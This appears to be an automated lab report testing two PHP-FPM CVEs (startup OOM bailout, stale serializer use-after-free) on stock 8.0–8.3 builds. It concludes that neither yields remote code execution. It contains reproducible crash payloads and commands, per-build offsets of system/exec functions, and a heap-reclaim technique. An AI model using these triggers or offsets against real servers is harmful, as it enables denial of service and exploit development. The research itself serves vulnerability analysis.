# Stock PHP-FPM 8.0–8.3 — CVE-2026-109619 and CVE-2026-109618 full-chain probe

Run root: `/tmp/opencode/research/fpm_80x_chain_20261023T085337Z`
Date: 2026-10-23 (UTC)
Scope: stock `php:<ver>-fpm` (Docker official images), stock nginx 1.30.1 front, `pm=dynamic`,
ASLR on, `display_errors=Off`, no application LFI, no third-party file write, no cross-worker
claims. All labs are private containers/ports created for this run; shared services were not
touched.

**Verdict in one line:** both primitives are real on the vulnerable builds, but neither yields
stock-FPM RCE within the stated constraints. 109619 dies at `php_request_startup()` (worker
destroyed before any consumer); 109618 is a pre-RINIT stale-serializer UAF that reliably
SIGSEGVs the worker but has no leak/controlled-target path to code execution.

---

## 1. Environment and method

### 1.1 Builds

| build | image | role | fix status (source) |
|---|---|---|---|
| 8.0.30 | `mirror.gcr.io/library/php:8.0.30-fpm` | last 8.0 tag | vulnerable (no backport; 8.0 is EOL) |
| 8.1.34 | `mirror.gcr.io/library/php:8.1.34-fpm` | last 8.1 tag | vulnerable (no backport; 8.1 is EOL) |
| 8.2.34 | `mirror.gcr.io/library/php:8.2.34-fpm` | last vulnerable 8.2 | vulnerable; fixed in 8.2.35 |
| 8.3.35 | `mirror.gcr.io/library/php:8.3.35-fpm` | last vulnerable 8.3 | vulnerable; fixed in 8.3.36 |
| 8.3.36 | `mirror.gcr.io/library/php:8.3.36-fpm` | fixed control | FIXED (`php_basic_early_rinit`) |

Source probe of the later branches (no duplicate dedicated-pool runtime work):
**8.4.26 vulnerable → 8.4.27 fixed; 8.5.11 vulnerable → 8.5.12 fixed.** The fix is the same
commit `31c0ea7d7f` *Avoid state corruption via bailout* (8.5.12; backports 8.3: `3c832b523e`,
8.2: in 8.2.35, 8.4: in 8.4.27). NEWS entry in 8.3.36/8.5.12:

```
. Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via
  bailout). (CVE-2026-109618, CVE-2026-109619)
```

The fix replaces the startup OOM bailout with `UnwindExit` (109619) and adds
`php_basic_early_rinit()` (called from `php_request_startup()` before `php_hash_environment()`),
which resets `BG(serialize_lock)=0`, `memset(&BG(serialize),0)` and
`memset(&BG(unserialize),0)` (109618):

```c
/* ext/standard/basic_functions.c, 8.3.36 */
PHPAPI void php_basic_early_rinit(void)
{
    BG(serialize_lock) = 0;
    memset(&BG(serialize), 0, sizeof(BG(serialize)));
    memset(&BG(unserialize), 0, sizeof(BG(unserialize)));
    php_url_scanner_early_rinit();
}
```

### 1.2 Front end and pools

* nginx 1.30.1 (`/opt/nginx-1.30.1/sbin/nginx`), private prefixes under the run root, one
  stock front (`client_max_body_size` default 1 MiB, no buffering tricks) per build plus
  diagnostic fronts (64 MiB body cap; buffered/`proxy_request_buffering off`) where stated.
* FPM: stock image config, `pm=dynamic`, `pm.max_children=5`, `memory_limit=128M`,
  `post_max_size=8M`, `upload_max_filesize=2M`, `session.upload_progress.enabled=1`,
  `session.use_only_cookies=1`, `display_errors=Off`, `log_errors=On`.
* Rootless Docker: published ports only (no `--network host`); the FPM pool access log format
  is `%p %R %m %s %f dur=%d` so every request line starts with the worker PID.
* Pinning: four concurrent `slow.php?s=N` requests occupy four of five workers; the producer
  and the following consumer then share the single free worker. All crash claims below are
  backed by `producer PID == consumer PID` in the access log and by the following request
  getting a fresh PID.
* The containers run the stock entrypoint/binary; no restart of any shared service, no gdb
  on the stock builds (symbol builds are out of scope for the 8.0–8.3 matrix; the companion
  BG study covers gdb on 8.4/8.5).

### 1.3 Per-build offsets (derived from the shipped binary, `bin/offsets.py`)

File offsets in the PIE image (runtime address = load base + offset). Validation: the
`system`/`exec`/`passthru` function-entry cluster in `.data.rel.ro` agrees to ±0x10.

| build | sha256 | Build ID | `zval_ptr_dtor` | `zif_system` | `zif_exec` | `zif_passthru` |
|---|---|---|---|---|---|---|
| 8.0.30 | `ca55d8d68a2f6a37…` | `31d8d0baedf0ff1b…` | `0x51b470` | `0x4330a0` | `0x433090` | `0x4330b0` |
| 8.1.34 | `eeb0fd78c976067c…` | `deecdd690314d7ac…` | `0x5388d0` | `0x450bf0` | `0x450be0` | `0x450c00` |
| 8.2.34 | `5a7856dd813b314d…` | `1827a7097158d788…` | `0x566a50` | `0x47aca0` | `0x47ac90` | `0x47acb0` |
| 8.3.35 | `7ac3eb76f3cdb7f0…` | `26900032ef0418e8…` | `0x57c110` | `0x489540` | `0x489530` | `0x489550` |

Reproduce with `python3 bin/offsets.py out/php-fpm-<ver>` (full SHA-256 and Build ID are in
`out/` and in §5).

---

## 2. CVE-2026-109619 — producer/consumer matrix

### 2.1 Bodies

| name | size | shape |
|---|---|---|
| A2 | 279,369 B | multipart, 997 parts (fits stock nginx 1 MiB, `post_max_size=8M`) |
| A1 | 1,060,211 B | multipart, single large part (over stock 1 MiB; needs the 64 MiB diagnostic front) |
| B1 | 33,128,677 B | single big multipart part (over stock 1 MiB; diagnostic front only) |

The 109619 producer is a startup-OOM during multipart/`$_POST` construction. When it fires,
`php_request_startup()` catches the bailout, FPM runs `php_module_shutdown()` and the child
returns `FPM_EXIT_SOFTWARE` (exit code 70); the worker is destroyed **before** any subsequent
request can run in it, so there is no consumer state to inherit.

### 2.2 Per-build results (stock front unless noted)

| build | A2 (279,369 B) | A1 stock | A1 64 MiB diag | B1 stock | B1 64 MiB diag |
|---|---|---|---|---|---|
| 8.0.30 | **200**, worker survives (peak scan below) | 413 (1 MiB cap) | **200** (no OOM) | 413 (1 MiB cap) | not run (A1 diag already 200) |
| 8.1.34 | **502 ×3**, child exit 70 | 413 | **502**, child exit 70 | 413 | buffered: `post=0 CL=33128677`; chunked+buffered: `post=0 CL=33128677 TE=chunked`; chunked+nobuf: `post=0 CL='' TE=chunked` |
| 8.2.34 | **502 ×3**, child exit 70 | 413 | **502**, child exit 70 | 413 | same as 8.1.34 |
| 8.3.35 | **502 ×3**, child exit 70 | 413 | **502**, child exit 70 | 413 | same as 8.1.34 |
| 8.3.36 (control) | **200 ×2**, `PEAK=46137344 POST=117` | — | **200** | — | — |

Stock-front `413` cells are nginx's deterministic 1 MiB cap (A1 = 1,060,211 B > 1,048,576 B;
B1 = 33,128,677 B); the A1/B1 diagnostics use the 64 MiB front, with `post_max_size=8M` still
enforced by PHP.

FPM log for the A2 502s (8.1/8.2/8.3, identical shape):

```
PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted
(tried to allocate ...) in Unknown on line 0
WARNING: [pool www] child <N> exited with code 70 after ...
```

8.0.30 is the exception: A2's 997 parts stay just under the 128 MiB limit (the n1000 scale
body, ~1017 parts, peaks at 130,023,424 B). The scaled peak scan (`memory_get_usage(true)`)
on the same body shape:

```
n950   PEAK=123731968 POST=2 FILES=1
n980   PEAK=127926272 POST=2 FILES=1
n1000  PEAK=130023424 POST=2 FILES=1     ← A2 scale
p1200  PEAK=132120576 POST=1 FILES=1
p1600  PEAK=132120576 POST=1 FILES=1
```

All are below `134217728` (128 MiB), hence no fatal. The parser's
`max_multipart_body_parts=1020` cap is visible in the warnings at the top of the scale. The
same build does OOM with a body big enough to cross the limit: a 4,401,618 B single-part body
on the 64 MiB front gives **502** and

```
[23-Oct-2026 ...] WARNING: [pool www] child 16 exited with code 70 after ...
PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted
(tried to allocate 4000032 bytes) in Unknown on line 0
```

so 8.0.30's negative for A2 is a size-threshold artifact, not a missing primitive.

### 2.3 Pinned pair tests — no state inheritance

With four workers pinned, A2 kills the pinned free worker (exit 70). The following small
consumer always lands on a **fresh** PID and decodes a reference session normally:

```
# 8.1.34
CONSUMER PID=28 STATUS=2 SID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa SESSION=["p"]
# 8.3.35
CONSUMER PID=28 STATUS=2 SID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa SESSION=["p"]
# 8.2.34 (cookie variant)
CONSUMER PID=49 STATUS=2 SID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa SESSION=["p"]
```

No 109619 consumer ever observes producer-modified state; there is no cross-worker claim.

### 2.4 109619 verdict

Stock nginx + stock FPM: the only reachable 109619 effect is a startup OOM that destroys the
worker (`FPM_EXIT_SOFTWARE`, 70). The chain stops at the `php_request_startup()` bailout
handler; there is no consumer phase on the same worker. On 8.0.30 the stock-size A2 does not
even reach the OOM because the part-cap keeps the peak under 128 MiB. **No RCE, no state
inheritance, no cross-worker primitive.**

---

## 3. CVE-2026-109618 — stale serializer state (pre-RINIT UAF)

### 3.1 Mechanism

Identical across 8.0–8.4 (verified in the source):

```c
/* ext/standard/var_unserializer.re */
PHPAPI php_unserialize_data_t php_var_unserialize_init(void) {
    if (BG(serialize_lock) || !BG(unserialize).level) {
        ... allocate d; BG(unserialize).data = d; BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;      /* stale pointer reused */
        ++BG(unserialize).level;
    }
    return d;
}
```

`unserialize()`/`serialize()` set `level=1`; an OOM bailout skips the matching
`php_var_*_destroy`; `php_request_shutdown()` on the vulnerable builds does not reset
`BG(unserialize)`/`BG(serialize)` (no reset in `main/` or `ext/session/`; the 8.0/8.1
`php_var_unserialize_init()` reuse condition is byte-for-byte the same as the vulnerable
8.3/8.4 code — the fix only adds `php_basic_early_rinit()` in the fixed releases). The next
request that runs in that worker
and touches the session *before RINIT* — the stock `session.upload_progress` multipart
callback — calls `php_session_initialize()` → `ps_srlzr_decode_php()` →
`php_var_unserialize_init()` and dereferences the freed `php_unserialize_data`:

```
php_request_startup
  php_hash_environment
    zend_activate_auto_globals
      php_auto_globals_create_post
        php_default_treat_data
          sapi_handle_post
            rfc1867_post_handler
              php_session_rfc1867_callback
                php_session_rfc1867_update
                  php_session_initialize
                    php_session_decode
                      ps_srlzr_decode_php
                        php_var_unserialize_init   ← stale BG(unserialize).data
                          var_tmp_var / tmp_var     ← SIGSEGV
```

The encode side is the analogue: `php_session_flush(1)` → `php_var_serialize_init()` (stale
`BG(serialize)`) → `php_add_var_hash()` → `zend_hash_index_add_new()` on the stale
`php_serialize_data.ht`; the session value must contain a PHP reference/object to call
`php_add_var_hash()`.

The consumer transport needs no cookie: the multipart parser stores the field named
`PHPSESSID` into `progress->sid` (field must precede `PHP_SESSION_UPLOAD_PROGRESS`), and the
FILE_START handler sets `PS(id)` and starts the session pre-RINIT even with
`session.use_only_cookies=1`.

### 3.2 Producer / consumer bodies used

```
# producer (GET, no body limits involved)
producer_oom.php?n=8000000        # 32 MB serialized array; OOM at zend_hash_real_init_mixed
                                  #   tried to allocate 335544320 bytes, line 7
producer_ser_oom.php?n=300000     # array_fill(0,300000,str_repeat('A',512)) then serialize()
                                  #   OOM tried to allocate 65015808 bytes, line 5

# consumer (multipart, ~243 B)
--X
Content-Disposition: form-data; name="PHPSESSID"          → stock1 / ref1 / enc1
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS" → bgupload
Content-Disposition: form-data; name="f"; filename="a.txt" → A
--X--
```

Session files in the container (`/tmp`, `www-data`):

```
/tmp/sess_stock1  = p|s:5:"hello";                              # simple decode
/tmp/sess_ref1    = p|a:2:{i:0;s:5:"hello";i:1;R:2;}            # reference decode
/tmp/sess_enc1    = p|a:2:{i:0;s:5:"hello";i:1;R:2;}            # reference encode
```

The session decode/flush happens during FILE_START, i.e. **before RINIT**; `consumer.php`
itself (`session_start(); echo ...`) then sees a fresh session because RINIT reset the
pre-RINIT state. A 200 with `SESSION=[]` and a new `Set-Cookie` is therefore normal for the
surviving cases; the crash cases return nginx 502 and leave only the FPM SIGSEGV line.

### 3.3 Runtime matrix on stock `pm=dynamic`

Pinning: 4 × `slow.php` + one free worker; every crash below is on the same PID that ran the
producer (access log), and the request after the crash gets a new PID.

| build | decode `p|s:5:"hello";` | decode `p|a:2:{…R:2;}` | encode (reference session) |
|---|---|---|---|
| 8.0.30 | **4/9 SIGSEGV** (86, 130, 143, 156) | **2/4 SIGSEGV** (178, 191) | **3/3 SIGSEGV** (107, 114, 121) |
| 8.1.34 | 0/4 | **4/4 SIGSEGV** (26, 39, 52, 65) | 0/4 (session path survived, consumers 200) |
| 8.2.34 | 0/3 | **3/3 SIGSEGV** (23, 30, 43) | **3/3 SIGSEGV** (56, 63, 70) |
| 8.3.35 | 0/3 | **3/3 SIGSEGV** (23, 31, 44) | **3/3 SIGSEGV** (57, 64, 71) |
| **8.3.36 (fixed)** | **0/3** | **0/3** | **0/6** (producer exits 137 ×6; consumers 200) |

Raw FPM lines (full log in `evidence/<build>-bg/fpm-docker.log`; consolidated in
`evidence/109618-crash-lines.md`):

```
[23-Oct-2026 09:18:44] WARNING: [pool www] child 86 exited on signal 11 (SIGSEGV) after 0.897320 seconds from start
[23-Oct-2026 09:19:24] WARNING: [pool www] child 107 exited on signal 11 (SIGSEGV) after 1.004347 seconds from start
[23-Oct-2026 09:19:25] WARNING: [pool www] child 114 exited on signal 11 (SIGSEGV) after 0.482102 seconds from start
[23-Oct-2026 09:19:25] WARNING: [pool www] child 121 exited on signal 11 (SIGSEGV) after 0.508704 seconds from start
[23-Oct-2026 09:20:02] WARNING: [pool www] child 130 exited on signal 11 (SIGSEGV) after 1.332630 seconds from start
[23-Oct-2026 09:20:02] WARNING: [pool www] child 143 exited on signal 11 (SIGSEGV) after 0.692593 seconds from start
[23-Oct-2026 09:20:03] WARNING: [pool www] child 156 exited on signal 11 (SIGSEGV) after ...
...
[23-Oct-2026 09:26:07] WARNING: [pool www] child 26 exited on signal 11 (SIGSEGV) after 0.943990 seconds from start   (8.1.34)
[23-Oct-2026 09:27:37] WARNING: [pool www] child 23 exited on signal 11 (SIGSEGV) after 0.233914 seconds from start   (8.2.34)
[23-Oct-2026 09:28:41] WARNING: [pool www] child 23 exited on signal 11 (SIGSEGV) after 0.236296 seconds from start   (8.3.35)
```

Same-worker correlation (8.3.35 excerpt; the producer 500 and the crashing consumer are both
on PID 23; after the crash the next producer is PID 31):

```
23 ... GET 500 .../producer_oom.php dur=0.049
23 ... POST 200 .../consumer.php  dur=0.008      ← simple decode, survives
23 ... GET 500 .../producer_oom.php dur=0.041
31 ... GET 500 .../producer_oom.php dur=0.043   ← previous worker 23 crashed on the ref consumer
```

8.0.30 shows the same pattern on 86/99 (simple decode), 107/114/121 (encode) and
130/143/156 (simple decode); 8.2.34 on 23/30/43 and 56/63/70.

Two parameters matter:

* **Decode payload.** `p|s:5:"hello";` only reaches `var_tmp_var`'s stale-table path; on the
  newer builds the freed block often still holds benign words, so the request survives. The
  reference payload `p|a:2:{i:0;s:5:"hello";i:1;R:2;}` forces `var_replace`/`php_add_var_hash`
  dereferences and is 3/3–4/4 on every vulnerable build (2/4 on 8.0.30). This is heap-layout
  sensitivity, not a different primitive.
* **Encode payload** must contain a reference: the upload-progress array alone (scalars) does
  not call `php_add_var_hash()`. 8.1.34 is the one build where the encode consumer did not
  fault in 4 tries; its decode side fired 4/4 on the same pinned worker, so the state exists.

### 3.4 Fixed control (8.3.36)

Same bodies, same pinning, same worker-count. `php_basic_early_rinit()` clears the BG state
before `php_hash_environment()`:

```
CTL2 DECREF 1 STATUS=500 STATUS=200 STATUS=2 STATUS=2
CTL2 DECREF 2 STATUS=500 STATUS=200 STATUS=2 STATUS=2
CTL2 DECREF 3 STATUS=500 STATUS=200 STATUS=2 STATUS=2
CTL2 ENC    1 STATUS=502 STATUS=200 STATUS=2 STATUS=2
CTL2 ENC    2 STATUS=502 STATUS=200 STATUS=2 STATUS=2
CTL2 ENC    3 STATUS=502 STATUS=200 STATUS=2 STATUS=2
WARNING: [pool www] child 23 exited with code 137 after 0.341815 seconds from start
WARNING: [pool www] child 30 exited with code 137 after 0.438821 seconds from start
WARNING: [pool www] child 43 exited with code 137 after 0.403947 seconds from start
```

No `signal 11` line. The encode producer now hits the 200% hard limit and exits 137, so no
state can survive; the decode producer's bailout is unwound (`UnwindExit`) and the early-rinit
reset covers the rest.

### 3.5 Why this stops before RCE

The crash is a dereference of a freed `php_unserialize_data` (decode) or
`php_serialize_data.ht` (encode). The freed block *can* be reclaimed by the consumer's own
pre-FILE_START multipart fields: in the companion 8.5.11 analysis a `pad` field of `'P'`
(0x50) overwrote the block and the fault showed `rax=0x5050505050505050` (controlled qwords).
That is a real stepping stone, but it is still a **wild-pointer dereference**:

1. The stale pointer itself lives in `BG(unserialize).data`; request input cannot rewrite it.
2. The consumer controls the *contents* of the reclaimed block (pointer fields included), but
   not any address in the target process. ASLR is on and there is no leak: `display_errors=Off`,
   no response-body echo of the stale state, no other pre-RINIT output channel. The only
   observable is the worker's SIGSEGV/exit.
3. `php_add_var_hash()`/`var_tmp_var()` then dereference those controlled qwords as `HashTable*`
   /`zval*`; with no mapped address to target, the process dies at the dereference. No write
   to a controlled address, no function-pointer call, no marker/`uid` — in any of the 8.0–8.3
   runs.

The exact blocker stage is therefore: **controlled fake `php_unserialize_data`/var_hash with a
known mapped target**. Getting past it requires an address disclosure (or a same-worker
non-ASLR/brute-force setup), which the stock stack under the stated constraints does not
provide. This is consistent with the public survey's "source-analysis-susceptible, no complete
public FPM exploit".

### 3.6 8.4.26 / 8.5.11 source probe (no duplicate dedicated-pool work)

| release | `php_basic_early_rinit` | verdict |
|---|---|---|
| 8.4.26 | absent | vulnerable |
| 8.4.27 | present | fixed |
| 8.5.11 | absent | vulnerable |
| 8.5.12 | present | fixed |

Both 8.4.26 and 8.5.11 contain the same `php_var_unserialize_init()` reuse and the same
session callback path; the fix is the 8.5.12 commit above (`31c0ea7d7f`, merged to 8.4 as
part of the 8.4.27 release). The runtime behaviour of those two builds is already covered by
the companion BG study (8.4.26 stock SIGSEGV; 8.5.11 stock SIGSEGV with `level=1, lock=0`;
8.5.12 fixed), so it is not repeated here.

---

## 4. Conclusion

* **109619 (stock nginx 1 MiB / stock `post_max_size=8M`)**: A2 is accepted by nginx on all
  builds. On 8.1.34/8.2.34/8.3.35 it OOMs during startup parse and the worker exits 70 before
  any consumer; B1 (33 MB) is rejected by stock nginx (413) and even on a 64 MiB front the
  parsed POST is empty (`post=0`). On 8.0.30 the same A2 stays under 128 MiB because of the
  1020-part cap; a larger diagnostic body still OOMs and exits 70. The fixed 8.3.36 handles
  A2 with a 44 MiB peak and A1 → 200, with no exits. **No cross-worker state, no RCE.**
* **109618 (all vulnerable builds)**: the stale `BG(unserialize)`/`BG(serialize)` state is
  real and reproducible. Decode with a reference payload fires 2/4 (8.0.30), 4/4 (8.1.34),
  3/3 (8.2.34), 3/3 (8.3.35); encode fires 3/3 on 8.0.30/8.2.34/8.3.35 (0/4 on 8.1.34). All
  are the same pre-RINIT `php_session_rfc1867_*` path, all on the same worker as the producer,
  all absent on the fixed 8.3.36. **The chain stops at the UAF dereference**: the stale block
  can be reclaimed with controlled bytes (0x50… on 8.5.11) but not at a known target address,
  and there is no leak under the stock constraints. No marker/`uid`, no second stage.
* **No stock-FPM RCE was achieved for either CVE on 8.0–8.3.** The stage-level blockers are
  `php_request_startup()` → `FPM_EXIT_SOFTWARE` (109619) and
  "controlled fake `php_unserialize_data` needs a known mapped target" (109618).

---

## 5. Artifacts

Run root `/tmp/opencode/research/fpm_80x_chain_20261023T085337Z`:

```
bin/lab.py            FPM container + three nginx fronts (stock / 64 MiB / nobuf)
bin/stage.py          raw HTTP client (GET/POST, --chunked, --cookie, --out)
bin/offsets.py        .data.rel.ro + nm -D offset derivation
www/producer_oom.php      decode OOM producer (n=8000000)
www/producer_ser_oom.php  encode OOM producer (n=300000)
www/consumer.php          session_start() consumer
www/slow.php              pinning
www/peak.php / cbprobe.php / probe.php / pid.php
conf/fpm-<ver>.conf, conf/php-lab.ini
logs/fpm-<ver>/access.log
evidence/8030-a2-stock, 8030-a1-diag, 8030-diag, 8030-peak, 8030-scale
evidence/8134-a2-stock, 8134-pair, 8234-a2-stock, 8234-pair, 8335-a2-stock, 8335-pair
evidence/8336-control
evidence/8030-bg, 8134-bg, 8234-bg, 8335-bg, 8336-bgctl, 8336-bgctl2
evidence/109618-crash-lines.md
out/php-fpm-8.0.30 … out/php-fpm-8.3.35
```

Binary digests / Build IDs:

```
8.0.30 ca55d8d68a2f6a371222919b977836cf23ba4310192074f0cebff2e8dd39431e
       Build ID 31d8d0baedf0ff1b4a977af5c499d5cb824e9cf1
8.1.34 eeb0fd78c976067c83abdde4b5e953424ce653933763442e66e7161129ae792c
       Build ID deecdd690314d7ac1ac10b12bdb6ee9a8cd2b911
8.2.34 5a7856dd813b314d005905873406df80f159c93c94c3469a60bbebf0cd80687e
       Build ID 1827a7097158d788d8109fb1aacbbe5dc9c848a3
8.3.35 7ac3eb76f3cdb7f0e1338476955e27a5c715253ea3494a3c9091eeb76a0883ac
       Build ID 26900032ef0418e8b9451d802c7bec77cea27772
```

Reproduction (per build):

```bash
python3 bin/lab.py up --ver 8.3.35 --image mirror.gcr.io/library/php:8.3.35-fpm \
    --port-base 19830 --mode stock
# create /tmp/sess_ref1 = p|a:2:{i:0;s:5:"hello";i:1;R:2;} as www-data in the container
# pin 4 of 5 workers
for i in 1 2 3 4; do curl -s "http://127.0.0.1:19831/slow.php?s=30" & done; sleep 1
# producer (pre-RINIT state corruption)
python3 bin/stage.py get "http://127.0.0.1:19831/producer_oom.php?n=8000000" --timeout 120
# consumer (same free worker): 502 + SIGSEGV expected on vulnerable builds
python3 bin/stage.py post http://127.0.0.1:19831/consumer.php cons_ref1.bin \
    'multipart/form-data; boundary=----X' --timeout 60
docker logs f80x-8335 2>&1 | grep 'signal 11'
```

Notes and limitations:

* 8.0.30/8.1.34 are EOL last tags; no 8.0.31/8.1.35 exists, so "fixed control" for those
  branches is not available upstream.
* The decode-simple crash rate is heap-layout dependent (4/9 on 8.0.30, 0/3–0/4 on the newer
  builds); the reference-bearing payload is the reliable trigger and is what the matrix above
  uses for the claim.
* The stack used here never exercised a cross-worker or dedicated-pool inheritance path: the
  producer worker is destroyed in every 109619 case, and the 109618 consumer must be pinned to
  the same worker deliberately.
